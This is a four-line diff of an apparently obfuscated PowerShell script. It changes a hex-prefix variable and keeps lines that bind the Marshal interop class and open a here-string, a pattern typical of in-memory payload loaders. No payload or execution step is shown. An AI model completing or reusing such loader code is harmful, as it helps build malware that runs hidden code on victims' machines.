@@ -1,4 +1,4 @@
-$vxck = "0xb"
+$vxck = "0x"
 $p = 0
 $7amada = [System.Runtime.InteropServices.Marshal]
 $ahh = @"
